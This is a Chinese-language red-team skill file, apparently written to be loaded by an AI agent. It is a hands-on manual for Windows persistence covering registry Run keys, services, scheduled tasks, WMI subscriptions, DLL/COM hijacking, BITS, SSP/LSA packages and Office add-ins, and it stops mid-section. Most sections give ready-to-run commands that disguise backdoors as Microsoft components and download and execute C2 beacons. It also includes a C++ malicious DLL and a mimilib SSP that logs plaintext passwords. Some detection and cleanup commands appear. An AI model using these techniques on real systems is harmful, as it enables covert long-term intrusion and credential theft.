---
name: "persistence-mechanisms"
description: "持久化机制全栈：Windows/Linux/macOS持久化/注册表/计划任务/WMI/服务/启动项/后门/rootkit/2026最新持久化/eBPF持久化/固件持久化/云持久化/容器持久化/检测绕过"
---

# SKILL: 持久化机制全栈 — 深度实战手册

> **AI LOAD INSTRUCTION**: 本技能聚焦操作系统与云原生平台下的持久化机制全生命周期。基础模型常把"持久化"简化为"添加注册表 Run 键"或"写 crontab"，本技能澄清：持久化是**红队攻防中从初始立足点到长期控制的完整技术体系**——涵盖 Windows/Linux/macOS 三大平台、从传统注册表/计划任务到 eBPF 内核级持久化、固件 UEFI 持久化、云原生容器持久化、C2 多级代理、Rootkit 隐蔽技术、检测绕过与反取证，以及完整自动化工具链。每节包含实战命令、PoC 代码、检测规则与清理方法，并融入 2026 年最新技术趋势。

## 0. RELATED ROUTING

- [windows-privilege-escalation](../windows-privilege-escalation/SKILL.md) — Windows 提权后持久化是维持访问的关键下一步
- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) — Linux 提权后持久化，crontab/systemd/内核模块
- [active-directory-lateral-movement](../active-directory-lateral-movement/SKILL.md) — 域控持久化，Golden Ticket/DCShadow/Skeleton Key
- [webshell-evasion](../webshell-evasion/SKILL.md) — WebShell 免杀与管理，Web 层持久化入口
- [network-penetration-testing](../network-penetration-testing/SKILL.md) — 内网渗透 C2 通道建立与持久化联动
- [exploit-development-framework](../exploit-development-framework/SKILL.md) — 内核级持久化与 Rootkit 开发
- [reverse-engineering](../reverse-engineering/SKILL.md) — 持久化机制逆向分析，Rootkit 检测
- [container-security-testing](../container-security-testing/SKILL.md) — 容器与 K8s 持久化
- [cloud-security-pentesting](../cloud-security-pentesting/SKILL.md) — 云平台持久化

---

## 1. Windows 持久化 — 经典技术全矩阵

Windows 持久化是红队最核心的技能之一。从最简单的注册表 Run 键到复杂的 SSP 身份验证包劫持，Windows 提供了数十种持久化接口。本节按攻击面类型系统化覆盖所有经典 Windows 持久化技术。

### 1.1 注册表 Run / RunOnce 键

注册表 Run 键是最经典、最常用的 Windows 持久化方法。系统启动时，explorer.exe 会自动执行这些键下的程序。

**位置清单**：
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run  (64位系统上的32位)
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
```

**实战命令**：
```powershell
# === 添加 Run 键持久化 ===
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f

# === PowerShell 远程加载（无文件落地） ===
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "OneDriveSync" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://C2_SERVER/payload.ps1')" /f

# === 使用 WMI 添加 ===
wmic startup add caption="MyStartup" command="C:\Windows\Temp\payload.exe"

# === PowerShell 注册表操作 ===
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateService" -Value "C:\backdoor.exe"
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "Cleanup" -Value "powershell.exe -enc <BASE64_PAYLOAD>" -PropertyType String -Force

# === 注册表 RunOnceEx（支持多命令） ===
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx\0001" /v "Depend" /t REG_SZ /d "0002:payload.exe" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx\0001" /v "Entry1" /t REG_SZ /d "C:\Windows\Temp\stage1.exe" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx\0002" /v "Entry1" /t REG_SZ /d "C:\Windows\Temp\stage2.exe" /f

# === 隐藏注册表键（使用 NULL 字符） ===
# Windows 注册表 API 遇到 NULL 字符会截断，但 regedit 可能无法显示
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SafeMode`0Hidden" /t REG_SZ /d "C:\backdoor.exe" /f
```

**检测方法**：
```powershell
# Autoruns 检查所有启动项
autorunsc.exe -a | findstr /i "run"

# PowerShell 枚举
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, User

# 注册表快照对比（建立基线后监控变化）
reg export HKLM\Software\Microsoft\Windows\CurrentVersion\Run baseline_run.reg
reg export HKLM\Software\Microsoft\Windows\CurrentVersion\Run current_run.reg
fc baseline_run.reg current_run.reg
```

**清理**：
```powershell
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateService"
```

### 1.2 Windows 服务持久化

Windows 服务是 SYSTEM 权限下运行的持久化机制，隐蔽性极高。攻击者可创建新服务或劫持现有服务。

**创建新服务**：
```powershell
# === 使用 sc.exe 创建服务 ===
sc create "WindowsUpdateSvc" binPath="C:\Windows\Temp\payload.exe" start=auto displayname="Windows Update Helper Service"
sc description "WindowsUpdateSvc" "Manages Windows Update downloads and installations"
sc start "WindowsUpdateSvc"

# === 使用 PowerShell 创建服务 ===
New-Service -Name "WinDefender" -BinaryPathName "C:\ProgramData\payload.exe" -DisplayName "Windows Defender Service" -StartupType Automatic
Start-Service -Name "WinDefender"

# === 使用 WMI 创建服务 ===
wmic service create name="SysHelper" displayname="System Helper" pathname="cmd.exe /c C:\Windows\Temp\backdoor.exe" startmode="Auto"

# === 创建服务但伪装成 Microsoft 服务 ===
sc create "WdFilter" binPath="C:\Windows\System32\drivers\payload.sys" type=kernel start=boot error=normal
# 注意：type=kernel 创建内核驱动，需要管理员权限和签名
```

**服务配置篡改（劫持现有服务）**：
```powershell
# === 修改现有服务 binPath ===
sc config "BITS" binPath="C:\Windows\Temp\payload.exe"
sc config "BITS" start=auto

# === 修改服务为交互式启动（允许服务与桌面交互） ===
sc config "BITS" type=interact type=own

# === 修改服务失败恢复操作（触发后门） ===
sc failure "BITS" reset=0 actions=restart/60000/restart/60000/run/60000
sc failure "BITS" command="C:\Windows\Temp\payload.exe"

# === 修改服务依赖注入 ===
# 使恶意服务依赖于合法服务，确保启动顺序
sc config "MalSvc" depend=RpcSs/Dnscache
```

**服务注册表劫持**：
```powershell
# === 服务的注册表路径 ===
# HKLM\System\CurrentControlSet\Services\<ServiceName>
# 修改 ImagePath 键值即可替换服务二进制

# === 将服务 ImagePath 改为 cmd.exe 管道加载 ===
reg add "HKLM\System\CurrentControlSet\Services\BITS" /v ImagePath /t REG_EXPAND_SZ /d "%COMSPEC% /c start /min C:\Windows\Temp\payload.exe" /f

# === 服务 DLL 劫持 ===
# 许多服务加载 DLL 时优先搜索当前目录，可放置恶意 DLL
# 查找服务 DLL 加载路径：
reg query "HKLM\System\CurrentControlSet\Services\<ServiceName>\Parameters" /v ServiceDll
```

**Svchost 服务劫持**：
```powershell
# === svchost.exe 服务组劫持 ===
# 查看 svchost 注册的组
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost"
# 在 netsvcs 组中添加恶意服务
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v "netsvcs" /t REG_MULTI_SZ /d "ExistingService1\0ExistingService2\0MalService" /f
# 创建对应的服务注册表项
reg add "HKLM\System\CurrentControlSet\Services\MalService" /v ServiceDll /t REG_EXPAND_SZ /d "C:\Windows\Temp\payload.dll" /f
reg add "HKLM\System\CurrentControlSet\Services\MalService" /v Start /t REG_DWORD /d 2 /f
reg add "HKLM\System\CurrentControlSet\Services\MalService" /v Type /t REG_DWORD /d 32 /f
```

**检测**：
```powershell
# 枚举所有自动启动的服务
Get-Service | Where-Object {$_.StartType -eq "Automatic"} | Format-Table Name, DisplayName, Status
Get-CimInstance Win32_Service | Where-Object {$_.StartMode -eq "Auto"} | Select Name, DisplayName, PathName, StartName

# 检查服务二进制签名
Get-AuthenticodeSignature -FilePath (Get-CimInstance Win32_Service | Where-Object {$_.StartMode -eq "Auto"}).PathName

# 检查新创建的服务
Get-WinEvent -LogName System -FilterXPath "*[System[EventID=7045]]" | Select-Object TimeCreated, Message
```

### 1.3 计划任务持久化

计划任务（Scheduled Tasks）是 Windows 持久化中最灵活的技术之一，支持多种触发器和操作。

**创建计划任务**：
```powershell
# === schtasks 创建基础任务 ===
schtasks /create /tn "WindowsUpdateTask" /tr "C:\Windows\Temp\payload.exe" /sc daily /st 09:00 /ru SYSTEM /f
schtasks /create /tn "SystemMaintenance" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\script.ps1" /sc minute /mo 5 /ru SYSTEM /f

# === 创建隐藏任务 ===
schtasks /create /tn "CacheCleanup" /xml "C:\ProgramData\task.xml" /f
# task.xml 内容自定义，可实现更复杂的触发条件

# === PowerShell ScheduledTasks 模块 ===
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -EncodedCommand <BASE64>"
$trigger = New-ScheduledTaskTrigger -AtLogon -User "NT AUTHORITY\SYSTEM"
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "SystemHealthCheck" -Action $action -Trigger $trigger -Principal $principal -Settings $settings

# === 用户登录时触发 ===
schtasks /create /tn "LogonTask" /tr "C:\backdoor.exe" /sc onlogon /ru SYSTEM /f

# === 系统启动时触发 ===
schtasks /create /tn "BootTask" /tr "C:\Windows\Temp\persist.exe" /sc onstart /ru SYSTEM /f

# === 事件触发（日志事件） ===
# 当特定事件 ID 出现时触发任务，例如用户登录事件 4624
$trigger = New-ScheduledTaskTrigger -AtLogon
# 高级事件触发需要使用 XML 配置
```

**XML 计划任务高级配置**：
```xml
<!-- C:\ProgramData\sched_task.xml -->
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>Microsoft Corporation</Author>
    <Description>Windows Update Health Check</Description>
    <URI>\Microsoft\Windows\UpdateOrchestrator\HealthCheck</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <UserId>NT AUTHORITY\SYSTEM</UserId>
    </LogonTrigger>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://C2_SERVER/beacon.ps1')"</Arguments>
    </Exec>
  </Actions>
</Task>
```

**注册计划任务**：
```powershell
Register-ScheduledTask -Xml (Get-Content "C:\ProgramData\sched_task.xml" | Out-String) -TaskName "UpdateOrchestratorHealth"
```

**检测**：
```powershell
# 枚举所有计划任务
schtasks /query /fo LIST /v | findstr /i "TaskName\|Task To Run"
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | Select TaskName, TaskPath, @{N="Action";E={$_.Actions.Execute}}

# 检查任务二进制文件
Get-ScheduledTask | ForEach-Object {
    $_.Actions | Where-Object {$_.Execute -like "*temp*" -or $_.Execute -like "*appdata*"}
}

# 监控计划任务创建事件
Get-WinEvent -LogName "Microsoft-Windows-TaskScheduler/Operational" -FilterXPath "*[System[EventID=106]]"
```

### 1.4 WMI 事件订阅持久化

WMI（Windows Management Instrumentation）事件订阅是 Windows 上最隐蔽的持久化技术之一，因为它在系统启动时自动加载，且不留下磁盘文件痕迹。

**WMI 事件订阅架构**：
- __EventFilter：定义触发条件（如系统启动、进程创建、时间间隔）
- __EventConsumer：定义响应动作（执行命令、运行脚本）
- __FilterToConsumerBinding：将 Filter 和 Consumer 绑定

**PowerShell WMI 持久化**：
```powershell
# === 系统启动时触发（ActiveScriptEventConsumer） ===
$filterName = "WindowsUpdateFilter"
$consumerName = "WindowsUpdateConsumer"

# 创建事件过滤器：系统启动后 5 分钟内触发
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = $filterName
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 300"
}

# 创建事件消费者：执行 PowerShell 命令
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = $consumerName
    CommandLineTemplate = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('http://C2_SERVER/beacon.ps1')`""
}

# 绑定 Filter 和 Consumer
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $filter
    Consumer = $consumer
}

# === 使用 ActiveScriptEventConsumer（VBScript/JScript） ===
$filterName2 = "ScriptFilter"
$consumerName2 = "ScriptConsumer"

$filter2 = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = $filterName2
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.LogFile='System' AND TargetInstance.EventCode=6005"
}

$consumer2 = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = $consumerName2
    ScriptingEngine = "VBScript"
    ScriptText = @"
Dim objShell
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command IEX(New-Object Net.WebClient).DownloadString('http://C2_SERVER/beacon.ps1')", 0, False
Set objShell = Nothing
"@
}

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $filter2
    Consumer = $consumer2
}
```

**WMI 持久化工具**：
```powershell
# === SharpSploit (Cobalt Strike 内置) ===
# execute-assembly SharpSploit.dll Persistence WMI

# === PowerSploit Persistence ===
Import-Module PowerSploit.psd1
Get-PersistenceWMI -AtStartup -Command "C:\Windows\Temp\payload.exe"
Install-PersistenceWMI -AtStartup -Command "powershell.exe -WindowStyle Hidden -enc <BASE64>"

# === WMIPersistence (Python) ===
# python3 wmipersist.py -c "cmd.exe /c C:\payload.exe" -t startup
```

**检测**：
```powershell
# 枚举 WMI 事件订阅
Get-WmiObject -Namespace "root\subscription" -Class __EventFilter
Get-WmiObject -Namespace "root\subscription" -Class __EventConsumer
Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding

# 使用 Sysinternals Autoruns
autorunsc.exe -a -m | findstr /i "wmi"

# WMI 事件监控
Get-WinEvent -LogName "Microsoft-Windows-WMI-Activity/Operational" -FilterXPath "*[System[EventID=5861]]"
```

**清理**：
```powershell
Get-WmiObject -Namespace "root\subscription" -Class __EventFilter -Filter "Name='WindowsUpdateFilter'" | Remove-WmiObject
Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer -Filter "Name='WindowsUpdateConsumer'" | Remove-WmiObject
Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding | Where-Object {$_.Filter.Name -eq "WindowsUpdateFilter"} | Remove-WmiObject
```

### 1.5 启动文件夹持久化

启动文件夹是 Windows 最古老的持久化机制之一，但 2026 年仍然有效。

**位置**：
```
# 当前用户启动文件夹
C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

# 所有用户启动文件夹（需要管理员权限）
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```

**实战命令**：
```powershell
# === 复制 payload 到启动文件夹 ===
copy C:\Windows\Temp\payload.exe "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\OneDriveSync.exe"

# === 创建快捷方式（可自定义图标、参数） ===
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\WindowsHelper.lnk")
$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('http://C2/beacon.ps1')`""
$Shortcut.WindowStyle = 7  # Minimized
$Shortcut.IconLocation = "C:\Windows\System32\shell32.dll,13"
$Shortcut.Description = "Windows System Helper"
$Shortcut.Save()

# === 使用环境变量隐藏路径 ===
# 启动文件夹路径可通过环境变量引用
copy C:\Windows\Temp\payload.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\helper.exe"

# === 隐藏文件和文件夹 ===
attrib +h +s "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe"
```

### 1.6 DLL 劫持持久化

DLL 劫持利用 Windows DLL 搜索顺序的弱点，将恶意 DLL 放置在合法程序加载 DLL 的路径中。

**DLL 搜索顺序（默认）**：
1. 应用程序所在目录
2. 系统目录（C:\Windows\System32）
3. 16位系统目录（C:\Windows\System）
4. Windows 目录（C:\Windows）
5. 当前工作目录
6. PATH 环境变量中的目录

**常见 DLL 劫持目标**：
```powershell
# === 查找缺失 DLL ===
# 使用 Process Monitor 过滤 "NAME NOT FOUND" 和 ".dll" 路径
# 常见被劫持 DLL：
# - version.dll, userenv.dll, propsys.dll, dwmapi.dll
# - ntmarta.dll, profapi.dll, wtsapi32.dll, cryptbase.dll
# - bcrypt.dll, ncrypt.dll, sspicli.dll

# === 创建恶意 DLL（C++ 示例） ===
```

```cpp
// malicious_version.dll
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            // 启动 payload 在新线程中，避免阻塞 DLL 加载
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Payload, NULL, 0, NULL);
            break;
    }
    return TRUE;
}

DWORD WINAPI Payload(LPVOID lpParam) {
    // 加载 C2 beacon
    WinExec("powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command IEX(New-Object Net.WebClient).DownloadString('http://C2_SERVER/beacon.ps1')", SW_HIDE);
    return 0;
}
```

```powershell
# === 使用 PowerSploit 查找 DLL 劫持机会 ===
Find-DLLHijack -Path "C:\Program Files\VulnerableApp\"
Find-PathDLLHijack -Path "C:\Program Files\"

# === 使用 SharpDllProxy 代理原 DLL 调用 ===
# 生成代理 DLL 保持原功能不被破坏
# SharpDllProxy.exe -dll original.dll -output proxy.dll

# === 放置恶意 DLL ===
copy malicious_version.dll "C:\Program Files\VulnerableApp\version.dll"
```

### 1.7 COM 劫持持久化

COM（Component Object Model）劫持通过替换合法的 COM 对象 DLL 实现持久化。

**COM 劫持原理**：
```powershell
# === 查找可劫持的 COM 对象 ===
# 目标：HKCU\Software\Classes\CLSID\{CLSID} 下存在的 COM 对象
# 搜索条件：InprocServer32 键指向文件系统中不存在的 DLL

# === 使用 COM 劫持工具 ===
# SharpCOM - 枚举可劫持 COM 对象
# execute-assembly SharpCOM.exe scan

# === 手动劫持 COM 对象 ===
# 1. 找到目标 CLSID，例如计划任务相关的 {0F87369F-A4E5-4CFC-BD3E-73E6154572DD}
# 2. 复制该 CLSID 到 HKCU（HKCU 优先级高于 HKLM）
$clsid = "{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}"
New-Item -Path "HKCU:\Software\Classes\CLSID\$clsid" -Force
New-Item -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" -Name "(Default)" -Value "C:\Windows\Temp\payload.dll"
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" -Name "ThreadingModel" -Value "Apartment"

# 3. 当 explorer.exe 或任何进程调用该 COM 对象时，恶意 DLL 被加载
```

**计划任务 COM 劫持**：
```powershell
# 计划任务使用 COM 对象 {0F87369F-A4E5-4CFC-BD3E-73E6154572DD} (TaskScheduler)
# 劫持此 CLSID 可使计划任务相关操作加载恶意 DLL
```

### 1.8 AppInit_DLLs 持久化

AppInit_DLLs 是一个注册表键，允许指定 DLL 在每次创建新进程时加载到进程中。

```powershell
# === AppInit_DLLs 注册表路径 ===
# HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs
# HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs

# 启用 AppInit_DLLs
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\Windows\Temp\payload.dll" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v RequireSignedAppInit_DLLs /t REG_DWORD /d 0 /f

# === 注意 ===
# Windows 10/11 中 Secure Boot 和 ELAM 可能阻止 AppInit_DLLs
# 需要禁用 Secure Boot 或使用签名 DLL
```

### 1.9 BITS 任务持久化

BITS（Background Intelligent Transfer Service）是 Windows 用于后台文件传输的服务，可被滥用于持久化。

```powershell
# === 使用 PowerShell 创建 BITS 任务 ===
Import-Module BitsTransfer

# 创建 BITS 下载任务，完成后执行 payload
Start-BitsTransfer -Source "http://C2_SERVER/payload.exe" -Destination "C:\ProgramData\payload.exe" -Asynchronous

# 获取 BITS 任务并设置通知命令
$job = Get-BitsTransfer | Where-Object {$_.JobState -eq "Transferring"}
# BITS 任务完成后可通过设置 Notification 触发执行

# === 使用 SharpBITS ===
# execute-assembly SharpBITS.exe -action create -url http://C2_SERVER/payload.exe -dest C:\ProgramData\payload.exe

# === BITSAdmin 命令行 ===
bitsadmin /create "WindowsUpdateJob"
bitsadmin /addfile "WindowsUpdateJob" "http://C2_SERVER/payload.exe" "C:\ProgramData\payload.exe"
bitsadmin /SetNotifyCmdLine "WindowsUpdateJob" "C:\ProgramData\payload.exe" ""
bitsadmin /SetMinRetryDelay "WindowsUpdateJob" 60
bitsadmin /resume "WindowsUpdateJob"

# === 持久化 BITS 任务（重启后自动恢复） ===
bitsadmin /create /download "PersistJob"
bitsadmin /addfile "PersistJob" "http://C2_SERVER/beacon.exe" "C:\ProgramData\Microsoft\beacon.exe"
bitsadmin /SetNotifyCmdLine "PersistJob" "cmd.exe" "/c C:\ProgramData\Microsoft\beacon.exe"
bitsadmin /resume "PersistJob"
```

**检测**：
```powershell
bitsadmin /list /allusers /verbose
Get-BitsTransfer -AllUsers
```

### 1.10 安全支持提供者（SSP）持久化

SSP（Security Support Provider）是 Windows 身份验证架构的一部分，恶意 SSP DLL 可拦截所有登录凭据。

```powershell
# === 注册恶意 SSP DLL ===
# 注册表路径：HKLM\System\CurrentControlSet\Control\Lsa\Security Packages
# 注册表路径：HKLM\System\CurrentControlSet\Control\Lsa\OSConfig\Security Packages

# 复制恶意 SSP DLL
copy mimilib.dll C:\Windows\System32\mimilib.dll

# 注册 SSP
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f

# 重启后生效，所有登录凭据将以明文记录到 C:\Windows\System32\kiwissp.log

# === Mimikatz 内存 SSP（无需重启，无需注册表） ===
# mimikatz # privilege::debug
# mimikatz # misc::memssp
# 此方法将 mimilib.dll 注入 LSASS，实时记录明文密码

# === 使用 PowerShell 注入 ===
# 利用 Invoke-Mimikatz 的 memssp 功能
```

### 1.11 LSA 身份验证包持久化

LSA（Local Security Authority）身份验证包是比 SSP 更深层的持久化。

```powershell
# === 注册 LSA 身份验证包 ===
# 注册表路径：HKLM\System\CurrentControlSet\Control\Lsa\Authentication Packages

# 复制恶意 DLL
copy auth_package.dll C:\Windows\System32\auth_package.dll

# 注册身份验证包
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0\0auth_package" /f

# 重启后生效，DLL 将在 LSASS.exe 进程空间内加载
```

### 1.12 凭据提供者持久化

凭据提供者（Credential Provider）是 Windows 登录界面加载的 COM 对象，可被替换为恶意提供者。

```powershell
# === 注册恶意凭据提供者 ===
# 位置：HKLM\Software\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{CLSID}
# 或者：HKLM\Software\Microsoft\Windows\CurrentVersion\Authentication\Credential Provider Filters\{CLSID}

# 注册 COM 对象
reg add "HKLM\Software\Classes\CLSID\{YOUR-CLSID}" /ve /t REG_SZ /d "MyCredentialProvider" /f
reg add "HKLM\Software\Classes\CLSID\{YOUR-CLSID}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\malicious_cp.dll" /f
reg add "HKLM\Software\Classes\CLSID\{YOUR-CLSID}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f

# 注册为凭据提供者
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{YOUR-CLSID}" /ve /t REG_SZ /d "MyProvider" /f
```

### 1.13 打印监视器 / 端口监视器持久化

打印监视器（Print Monitor）和端口监视器（Port Monitor）是 Windows 打印子系统的一部分，以 SYSTEM 权限运行。

```powershell
# === 打印监视器持久化 ===
# 注册表路径：HKLM\System\CurrentControlSet\Control\Print\Monitors

# 复制恶意监视器 DLL
copy print_monitor.dll C:\Windows\System32\print_monitor.dll

# 注册打印监视器
reg add "HKLM\System\CurrentControlSet\Control\Print\Monitors\MaliciousMonitor" /v "Driver" /t REG_SZ /d "print_monitor.dll" /f

# 重启 Print Spooler 服务
net stop spooler && net start spooler

# === 端口监视器持久化 ===
# 注册表路径：HKLM\System\CurrentControlSet\Control\Print\Monitors\Standard TCP/IP Port\Ports
# 可添加恶意端口监视器
```

### 1.14 Time Providers 持久化

Windows Time Providers 是时间同步服务，可注册恶意 DLL 作为时间提供者。

```powershell
# === 注册恶意 Time Provider ===
# 注册表路径：HKLM\System\CurrentControlSet\Services\W32Time\TimeProviders\<ProviderName>

reg add "HKLM\System\CurrentControlSet\Services\W32Time\TimeProviders\MaliciousProvider" /v "DllName" /t REG_SZ /d "C:\Windows\System32\malicious_tp.dll" /f
reg add "HKLM\System\CurrentControlSet\Services\W32Time\TimeProviders\MaliciousProvider" /v "Enabled" /t REG_DWORD /d 1 /f
reg add "HKLM\System\CurrentControlSet\Services\W32Time\TimeProviders\MaliciousProvider" /v "InputProvider" /t REG_DWORD /d 1 /f

# 重启 W32Time 服务
sc stop w32time && sc start w32time
```

### 1.15 Office 加载项持久化

Microsoft Office 加载项（Add-ins）可在 Office 应用启动时加载恶意 DLL。

```powershell
# === Word 加载项 ===
# 位置：HKCU\Software\Microsoft\Office\<Version>\Word\Addins\<AddinName>
# 或者：%APPDATA%\Microsoft\Word\STARTUP\

# === Excel 加载项 ===
# 位置：%APPDATA%\Microsoft\Excel\XLSTART\

# === 通用 Office 加载项注册 ===
reg add "HKCU\Software\Microsoft\Office\16.0\Word\Addins\MalAddin" /v "Manifest" /t REG_SZ /d "C:\ProgramData\malicious_addin.vsto" /f
reg add "HKCU\Software\Microsoft\Office\16.0\Word\Addins\MalAddin" /v "LoadBehavior" /t REG_DWORD /d 3 /f

# === WEP 模板注入（Word/Excel/PowerPoint VBA 模板） ===
# 将恶意 .dotm 模板放置在启动路径
copy malicious_template.dotm "%APPDATA%\Microsoft\Templates\Normal.dotm"
```

### 1.16 屏幕保护程序持久化

```powershell
# === 屏幕保护程序配置 ===
# 注册表路径：HKCU\Control Panel\Desktop

# 设置屏幕保护程序为恶意可执行文件
